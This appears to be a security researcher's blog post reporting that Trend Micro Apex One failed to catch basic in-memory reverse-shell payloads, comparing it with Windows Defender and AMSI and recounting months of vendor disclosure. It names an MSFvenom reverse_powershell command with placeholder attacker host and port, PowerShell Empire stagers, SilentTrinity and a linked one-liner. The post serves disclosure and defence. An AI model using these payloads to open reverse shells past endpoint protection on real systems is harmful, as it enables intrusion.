![Linkedin](Post%20Images/linkedin.png) [Linkedin](https://www.linkedin.com/in/ryangore/) | ![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

# Bypassing Trend Micro Apex One
___________________________________

# Background
Imagnie, if you will, that your orginization utilizes a well known and 'trusted' Enterprise grade endpoint detection and response solution. Furthermore, imagine that you discover a way to bypass this solution, but to your horror a couple of seriously glarring issues come to the forefront: 
1. The EDR solution can be byapssed using simple or even very basic payloads. 
2. The EDR solution can be bypassed using exploit tools or frameworks that have aged well beyond the point where many would logically think that most vendors would have a solution to detect their signatures, etc.
3. A solution, update, signature, whatever still hasn't been deployed to clients despite working months on end with back-end engineers and other team members part of the vendor and providing beyond adequate information to help them.

Now, I'm a bit skeptical when it comes to AV and EDR solutions. One often hears sale reps tout about how great their product is. How it will *'block everything'*, *'prevent breaches'*, and blah, blah, blah. Obviously, a product like this isn't going to prevent bleeding edge methods or techniques that are used to get around them. The same goes for customized payloads. Heck, the simple reverse PowerShell script I wrote back in March surprisingly still gets around Defender and AMSI in Windows 10 build 1903. What I'm trying to get at, is that the art of bypassing anti-virus and EDR solutions is a whole other topic on its own that consists of individuals who know a much more than I do when it comes to this type of stuff. 

Before you ask, yes I did checking the settings in the administration console. I double checked, triple checked, checked again and then had a small existential crisis. Other collegaues and individuals from Trend have checked the settings. I'm sure they would have told me to shove off and check again by now if it was something on my end. 

![bms](Post%20Images/BMS.PNG)
![scs](Post%20Images/SCS.PNG)

After countless emails back and forth, a couple of phone calls later and a handful of updates pushed out, the problem still persists. I first notified Trend of the issue back in Feburary and it is now June. I should point out that Trend pushed out an update were at a point in the process in which we were able to get Apex One to succesfully block anything from PowerShell Empire. However, this glimer of hope only lasted for a short period of time before I tried again a couple of days later to test for consistency.

# Testing
I wanted to put Trend Micro's Apex One solution to the test. For the sake of testing, the scenario was set in a situation in which an attacker had some sort of low privilege access to the machine. This could be a reverse shell, recovered creds that allowed for smblogin, login through RDP, etc. Needless to say, I was bit shocked when I discovered how trivial it was to get around it. Before I started testing, I had done enough research to know the basics or at least have a decent grasp on the thought process that went into the techniques of bypassing AV and EDR soluitions. As expected, it was blocking anything malicious that touched the disk. However, things started going downhill when I started testing payloads that resided in memory only. Keep in mind I wasn't trying to get sophisticated or do anything advanced. All I was doing at this point was using well known and publicly available tools and frameworks and throwing them at my test machine to see if the agent would pick it up. All I wanted to do was to make sure it was stopping known payloads and tools.

### Tools and payloads that were used to bypass Apex One:
* MSFvenom: cmd/windows/reverse_powershell lhost=\<attackip\> lport=\<attakport\>
* PowerShell Empire with http listener and launcher to generate the stager
* My custom reverse PowerShell script
* A random reverse [PowerShell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
* SilentTrinity


# MSFVenom cmd/windows/reverse_powershell
![msfv_1](Post%20Images/kaliVM.PNG)
![msfv_2](Post%20Images/Win10Prod_LI.jpg)
![msfv_3](Post%20Images/msfvenom_payload.PNG)
![msfv_4](Post%20Images/Win10Prod_rpsh_exec.PNG)
![msfv_5](Post%20Images/msfv_bypass_LI.jpg)
![msfv_6](Post%20Images/msfv_bypass2_LI.jpg)

# Observations
As I mentioned previously, I worked with Trend to get a patch pushed out to specifically alarm on PowerShell Empire (they're still working on the MSFvenom payload). I recieved the patch on the specified date and it seemed like it was working. PSE was no longer receiving a callback from the target thus producing an agent that would allow me to interact with the remote host. Every thing was fine and dandy until I peformed the same test a couple of days later. Apex One had once again failed to alert on the C2 connection. At this time I noticed that the IP on my Kali box had changed. Was I able to bypass Apex One once more with PSE just by changing my IP? Yes, I was. To make sure I wasn't hallucinating, I had a collegue execute stager on their machine and sure enough I got a callback from the machine.

## PowerShell Empire



I noticed an anomoly during testing when using the MSFvenom payload cmd/windows/reverse_powershell in conjuntion with the Magic Unicorn payload generator from TrustedSec. Apex One was catching this for some reason despite being obfuscated via base64 encoding. My basic knowledge of how AV and EDR technologies work leads me to believe that the engine is building a risk rating based on several factors or attributes associated with the PowerShell code. Since the PowerShell code is obfuscated via base64 encoding, it uses this information as one factor along with several other factors to determine whether or not is is harmful. In this case it correctly identified that the payload generated from the Magic Unicorn payload generator is indeed malicious. The opposite occurs when planting the base64 encoded PowerShell payload generated from the launcher command in Empire PowerShell. I'm not so sure why it's catching one and not the other despite both payloads being encoded. Most of the other MSFVenom payloads that I've tested up to this point (windows/shell/reverse_tcp) and outputted in the formats `psh-cmd`, `hta-psh` is stopped by Apex One.


## PowerShell Empire
![PSE](Post%20Images/bypass_may8th_2019.jpg)
![PSE_June](Post%20Images/ao_pse.jpg)

# A Shockng Revelation
During testing, I needed to gather metrics from other AV and EDR solutions to compare against Apex One. Why not start with Windows Defender in the latest Windows 10 Pro build? I created an ISO build 1809 (and later 1903 after testing a trial version of CrowdStrike Falcon Prevent), installed the latest updates for the operating system and definitions for Defender. 

![winver](Post%20Images/winver.PNG)

The results shocked me to say the least. You'd think a free, built-in AV that comes with Windows would be absolute crap, but it's quite the opposite. From my testing, Windows Defender and ASMI in build 1809 was able to block everything Apex One wasn't. It even blocked the aforementioned PowerShell oneliner from the github link. 

![Github One-liner](Post%20Images/amsi_github_oneliner.PNG)

However, I was able get around it using my custom reverse PowerShell script (this was expected) and silenttrinity. Defender and ASMI did even better in build 1903 as it stone-walled everything except my custom reverse PowerShell script. I should state that more testing will need to be done with silenttrinity as I didn't recived a message from AMSI or Defender saying something malicous was going on. However, I recieved an error message telling me that the PowerShell stager with the embedded interpreter for the Boo lang payload and the MSBuild.xml stager failed to build correctly. This could be due to changes in the Windows operating system itself in build 1903 or changes in PowerShell and the .NET framework. To make sure I wasn't go insane and to rule out the environment as being the culprit of the issues with Apex One, I decided to unload and remove the Apex agent from a production workstation that wasn't important, let Defender take over and peform the same tests. Again, Defender stopped what Apex One couldn't.

# Conclusion
You defitnely know you have a problem when an AV included in almost every single version of Windows 10 does much better job than the other solution that has had research and development with fancy (or gimmicky) features like machine learing, poured into it. Again, there's no perfect AV and EDR or all-in-one solution that will catch ever single thing including bleeding edge tactics and manuvers. However, if you're going to make people and orginization pay for your product then it better be able to react to the most basic malicious payloads and exploitation frameworks. Especially, if they've been publicy available for a while and allow you to tear the source code apart to figure out how it works.
